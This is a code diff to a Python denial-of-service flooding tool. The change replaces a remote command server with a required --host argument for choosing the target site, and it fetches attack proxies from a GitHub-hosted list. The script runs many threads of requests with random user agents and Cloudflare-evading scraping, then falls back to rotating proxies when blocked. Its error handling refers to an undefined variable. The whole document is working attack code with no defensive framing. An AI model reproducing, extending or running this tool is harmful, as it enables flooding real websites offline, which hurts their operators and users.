@@ -18,7 +18,8 @@ import json
 import sys
 
 VERSION = 6
-HOSTS = ["https://juribaautomationapi.azurewebsites.net/api/proxy"]
+PROXY_SOURCE = 'https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json'
+HOSTS = []
 MAX_REQUESTS = 5000
 SUPPORTED_PLATFORMS = {
     'linux': 'Linux'
@@ -34,6 +35,7 @@ threads = int(sys.argv[1])
 parser = ArgumentParser()
 parser.add_argument("-v", "--verbose", dest="verbose", action='store_true')
 parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
+parser.add_argument('--host', type=str, required=True)
 parser.set_defaults(verbose=True)
 parser.set_defaults(no_clear=False)
 args, unknown = parser.parse_known_args()
@@ -63,27 +65,10 @@ def mainth():
         scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive',
                                'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br'})
         logger.info("GET RESOURCES FOR ATTACK")
-        host = choice(HOSTS)
-        content = scraper.get(host).content
-        if content:
-            try:
-                data = json.loads(content)
-            except json.decoder.JSONDecodeError:
-                logger.info('Host {} has invalid format'.format(host))
-                sleep(5)
-                continue
-            except Exception:
-                logger.exception('Unexpected error. Host {}'.format(host))
-                sleep(5)
-                continue
-        else:
-            sleep(5)
-            continue
-        logger.info("STARTING ATTACK TO " + data['site']['url'])
-        site = unquote(data['site']['url'])
-        if site.startswith('http') == False:
-            site = "https://" + site
 
+        # Hardcoded site
+        site = args.host
+        logger.info("STARTING ATTACK TO " + site)
         attacks_number = 0
 
         try:
@@ -93,7 +78,7 @@ def mainth():
             attack = scraper.get(site)
 
             if attack.status_code >= 302:
-                for proxy in data['proxy']:
+                for proxy in HOSTS:
                     scraper.proxies.update(
                         {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
                     response = scraper.get(site)
@@ -123,6 +108,22 @@ def mainth():
             continue
 
 
+def scrap_json():
+    scraper = cloudscraper.create_scraper(browser={'browser': 'firefox', 'platform': 'android', 'mobile': True}, )
+    content = scraper.get(PROXY_SOURCE).content
+    if content:
+        try:
+            data = json.loads(content)
+            return data
+        except json.decoder.JSONDecodeError:
+            raise Exception('Host {} has invalid format'.format(host))
+        except Exception:
+            raise Exception('Unexpected error. Host {}'.format(host))
+    else:
+        raise Exception('Unexpected error. Host {}'.format(host))
+
+
 if __name__ == '__main__':
+    HOSTS = scrap_json()
     for _ in range(threads):
         Thread(target=mainth).start()
